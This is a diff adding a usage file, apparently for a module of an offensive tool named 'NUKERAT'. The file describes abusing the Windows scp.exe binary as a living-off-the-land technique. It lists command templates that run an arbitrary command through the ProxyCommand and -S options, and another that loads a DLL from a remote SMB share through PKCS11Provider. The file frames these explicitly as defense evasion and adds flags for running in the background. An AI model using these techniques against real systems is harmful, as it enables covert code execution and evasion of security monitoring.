@@ -1,0 +1,22 @@
+ABOUT
+    Used for uploading or downloading files over SSH. LOLBAS
+    documents proxy execution of specified command, can be used as a
+    defensive evasion and performs indirect execution of a specified
+    DLL from a remote share, can be used for defense evasion.
+
+USAGE:
+    scp.exe -o ProxyCommand="{CMD}" . localhost:.
+    scp.exe -S "{CMD}" . localhost:.
+    scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
+
+EXAMPLES:
+    scp.exe -o ProxyCommand="{CMD}" . localhost:.
+    scp.exe -S "{CMD}" . localhost:.
+    scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    scp.exe -o ProxyCommand="{CMD}" . localhost:.
